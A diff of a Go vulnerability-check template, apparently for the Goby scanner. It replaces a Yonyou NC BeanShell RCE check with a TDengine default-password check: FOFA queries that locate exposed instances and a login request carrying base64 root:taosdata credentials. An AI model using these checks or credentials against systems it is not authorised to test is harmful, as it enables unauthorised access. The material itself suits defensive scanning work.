@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "TDengine Management Default Password",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"Tdengine\" || product=\"Tdengine\"",
+  "GobyQuery": "app=\"Tdengine\" || product=\"Tdengine\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -29,10 +29,12 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/admin/login",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Authorization": "Basic cm9vdDp0YW9zZGF0YQ=="
+        },
         "data_type": "text",
         "data": ""
       },
@@ -51,7 +53,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "\"status\":\"succ\"",
             "bz": ""
           }
         ]
@@ -107,7 +109,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "TDengine Management Default Password",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +118,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "TDengine Management Default Password",
       "Product": "",
       "Description": "",
       "Recommendation": "",
